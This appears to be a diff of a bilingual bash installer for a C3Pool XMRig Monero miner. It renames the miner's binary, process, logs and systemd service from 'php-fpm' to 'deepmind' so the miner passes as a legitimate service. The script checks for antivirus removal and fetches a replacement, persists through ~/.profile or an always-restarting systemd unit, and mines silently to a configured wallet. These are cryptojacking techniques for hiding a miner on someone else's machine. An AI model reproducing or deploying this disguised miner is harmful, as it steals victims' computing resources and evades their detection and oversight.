@@ -158,7 +158,7 @@ echo
 echo "[*] Removing previous c3pool miner (if any)"
 echo "[*] 卸载以前的 C3Pool 矿工 (如果存在)"
 if sudo -n true 2>/dev/null; then
-  sudo systemctl stop php-fpm.service
+  sudo systemctl stop deepmind.service
 fi
 killall -9 xmrig
 
@@ -182,18 +182,18 @@ if ! tar xf /tmp/xmrig.tar.gz -C $HOME/c3pool; then
   exit 1
 fi
 rm /tmp/xmrig.tar.gz
-mv $HOME/c3pool/xmrig $HOME/c3pool/php-fpm
-echo "[*] Checking if advanced version of $HOME/c3pool/php-fpm works fine (and not removed by antivirus software)"
-echo "[*] 检查目录 $HOME/c3pool/php-fpm 中的php-fpm是否运行正常 (或者是否被杀毒软件误杀)"
+mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind
+echo "[*] Checking if advanced version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
+echo "[*] 检查目录 $HOME/c3pool/deepmind 中的deepmind是否运行正常 (或者是否被杀毒软件误杀)"
 sed -i 's/"donate-level": *[^,]*,/"donate-level": 1,/' $HOME/c3pool/config.json
-$HOME/c3pool/php-fpm --help >/dev/null
+$HOME/c3pool/deepmind --help >/dev/null
 if (test $? -ne 0); then
-  if [ -f $HOME/c3pool/php-fpm ]; then
-    echo "WARNING: Advanced version of $HOME/c3pool/php-fpm is not functional"
-	echo "警告: 版本 $HOME/c3pool/php-fpm 无法正常工作"
+  if [ -f $HOME/c3pool/deepmind ]; then
+    echo "WARNING: Advanced version of $HOME/c3pool/deepmind is not functional"
+	echo "警告: 版本 $HOME/c3pool/deepmind 无法正常工作"
   else 
-    echo "WARNING: Advanced version of $HOME/c3pool/php-fpm was removed by antivirus (or some other problem)"
-	echo "警告: 该目录 $HOME/c3pool/php-fpm 下的xmrig已被杀毒软件删除 (或其它问题)"
+    echo "WARNING: Advanced version of $HOME/c3pool/deepmind was removed by antivirus (or some other problem)"
+	echo "警告: 该目录 $HOME/c3pool/deepmind 下的xmrig已被杀毒软件删除 (或其它问题)"
   fi
 
   echo "[*] Looking for the latest version of Monero miner"
@@ -216,26 +216,26 @@ if (test $? -ne 0); then
 	echo "警告: 无法解压 /tmp/xmrig.tar.gz 到 $HOME/c3pool 目录下"
   fi
   rm /tmp/xmrig.tar.gz
-  mv $HOME/c3pool/xmrig $HOME/c3pool/php-fpm
+  mv $HOME/c3pool/xmrig $HOME/c3pool/deepmind
 
-  echo "[*] Checking if stock version of $HOME/c3pool/php-fpm works fine (and not removed by antivirus software)"
-  echo "[*] 检查目录 $HOME/c3pool/php-fpm 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
+  echo "[*] Checking if stock version of $HOME/c3pool/deepmind works fine (and not removed by antivirus software)"
+  echo "[*] 检查目录 $HOME/c3pool/deepmind 中的xmrig是否运行正常 (或者是否被杀毒软件误杀)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/c3pool/config.json
-  $HOME/c3pool/php-fpm --help >/dev/null
+  $HOME/c3pool/deepmind --help >/dev/null
   if (test $? -ne 0); then 
-    if [ -f $HOME/c3pool/php-fpm ]; then
-      echo "ERROR: Stock version of $HOME/c3pool/php-fpm is not functional too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/php-fpm 也无法使用"
+    if [ -f $HOME/c3pool/deepmind ]; then
+      echo "ERROR: Stock version of $HOME/c3pool/deepmind is not functional too"
+	  echo "发生错误: 该目录中的 $HOME/c3pool/deepmind 也无法使用"
     else 
-      echo "ERROR: Stock version of $HOME/c3pool/php-fpm was removed by antivirus too"
-	  echo "发生错误: 该目录中的 $HOME/c3pool/php-fpm 已被杀毒软件删除"
+      echo "ERROR: Stock version of $HOME/c3pool/deepmind was removed by antivirus too"
+	  echo "发生错误: 该目录中的 $HOME/c3pool/deepmind 已被杀毒软件删除"
     fi
     exit 1
   fi
 fi
 
-echo "[*] Miner $HOME/c3pool/php-fpm is OK"
-echo "[*] 矿工 $HOME/c3pool/php-fpm 运行正常"
+echo "[*] Miner $HOME/c3pool/deepmind is OK"
+echo "[*] 矿工 $HOME/c3pool/deepmind 运行正常"
 
 #PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
 #PASS="365portalaz"
@@ -250,7 +250,7 @@ fi
 sed -i 's/"url": *"[^"]*",/"url": "auto.c3pool.org:'$PORT'",/' $HOME/c3pool/config.json
 sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
 sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $HOME/c3pool/config.json
-sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
+sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 95,/' $HOME/c3pool/config.json
 #sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json
 
@@ -263,13 +263,13 @@ echo "[*] Creating $HOME/c3pool/miner.sh script"
 echo "[*] 在该目录下创建 $HOME/c3pool/miner.sh 脚本"
 cat >$HOME/c3pool/miner.sh <<EOL
 #!/bin/bash
-if ! pidof php-fpm >/dev/null; then
-  nice $HOME/c3pool/php-fpm \$*
+if ! pidof deepmind >/dev/null; then
+  nice $HOME/c3pool/deepmind \$*
 else
   echo "Monero miner is already running in the background. Refusing to run another one."
-  echo "Run \"killall php-fpm\" or \"sudo killall php-fpm\" if you want to remove background miner first."
+  echo "Run \"killall deepmind\" or \"sudo killall deepmind\" if you want to remove background miner first."
   echo "门罗币矿工已经在后台运行。 拒绝运行另一个."
-  echo "如果要先删除后台矿工，请运行 \"killall php-fpm\" 或 \"sudo killall php-fpm\"."
+  echo "如果要先删除后台矿工，请运行 \"killall deepmind\" 或 \"sudo killall deepmind\"."
 fi
 EOL
 
@@ -286,7 +286,7 @@ if ! sudo -n true 2>/dev/null; then
     echo "Looks like $HOME/c3pool/miner.sh script is already in the $HOME/.profile"
 	echo "脚本 $HOME/c3pool/miner.sh 已存在于 $HOME/.profile 中."
   fi
-  echo "[*] Running miner in the background (see logs in $HOME/c3pool/php-fpm.log file)"
+  echo "[*] Running miner in the background (see logs in $HOME/c3pool/deepmind.log file)"
   echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/xmrig.log 日志文件)"
   /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
 else
@@ -300,8 +300,8 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/c3pool/php-fpm.log file)"
-	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/php-fpm.log 日志文件)"
+    echo "[*] Running miner in the background (see logs in $HOME/c3pool/deepmind.log file)"
+	echo "[*] 已在后台运行xmrig矿工 (请查看 $HOME/c3pool/deepmind.log 日志文件)"
     /bin/bash $HOME/c3pool/miner.sh --config=$HOME/c3pool/config_background.json >/dev/null 2>&1
     echo "ERROR: This script requires \"systemctl\" systemd utility to work correctly."
     echo "Please move to a more modern Linux distribution or setup miner activation after reboot yourself if possible."
@@ -309,12 +309,12 @@ else
   else
 
     echo "[*] Creating c3pool_miner systemd service"
-    cat >/tmp/php-fpm.service <<EOL
+    cat >/tmp/deepmind.service <<EOL
 [Unit]
 Description=Monero miner service
 
 [Service]
-ExecStart=$HOME/c3pool/php-fpm --config=$HOME/c3pool/config.json
+ExecStart=$HOME/c3pool/deepmind --config=$HOME/c3pool/config.json
 Restart=always
 Nice=10
 CPUWeight=1
@@ -322,15 +322,15 @@ CPUWeight=1
 [Install]
 WantedBy=multi-user.target
 EOL
-    sudo mv /tmp/php-fpm.service /etc/systemd/system/php-fpm.service
+    sudo mv /tmp/deepmind.service /etc/systemd/system/deepmind.service
     echo "[*] Starting c3pool_miner systemd service"
 	echo "[*] 启动c3pool_miner systemd服务"
-    sudo killall php-fpm 2>/dev/null
+    sudo killall deepmind 2>/dev/null
     sudo systemctl daemon-reload
-    sudo systemctl enable php-fpm.service
-    sudo systemctl start php-fpm.service
-    echo "To see miner service logs run \"sudo journalctl -u php-fpm -f\" command"
-	echo "查看矿工服务日志,请运行 \"sudo journalctl -u php-fpm -f\" 命令"
+    sudo systemctl enable deepmind.service
+    sudo systemctl start deepmind.service
+    echo "To see miner service logs run \"sudo journalctl -u deepmind -f\" command"
+	echo "查看矿工服务日志,请运行 \"sudo journalctl -u deepmind -f\" 命令"
   fi
 fi
 
@@ -340,11 +340,11 @@ echo "提示: 如果您使用共享VPS，建议避免由矿工产生100％的CPU
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e php-fpm -l $((75*$CPU_THREADS)) -b"
+  echo "sudo cpulimit -e deepmind -l $((75*$CPU_THREADS)) -b"
   if [ "`tail -n1 /etc/rc.local`" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e php-fpm -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e deepmind -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e php-fpm -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e deepmind -l $((75*$CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
